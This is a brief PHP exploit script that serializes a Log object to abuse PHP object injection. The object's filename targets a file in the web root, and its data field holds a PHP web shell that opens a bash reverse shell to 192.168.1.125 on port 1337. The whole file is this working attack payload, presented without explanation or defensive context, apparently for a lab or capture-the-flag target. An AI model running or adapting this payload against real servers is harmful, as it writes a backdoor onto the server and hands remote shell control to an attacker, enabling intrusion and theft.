<?php
class Log
{
    public $filename;
    public $data;

    public function __construct($filename, $data)
    {
        $this->filename = $filename;
	$this->data = $data;
    }
}

$logObject = new Log("/var/www/html/scriptz/rev.php", "<?php system(\"bash -c 'bash -i >& /dev/tcp/192.168.1.125/1337 0>&1'\"); ?>");

echo(serialize($logObject));

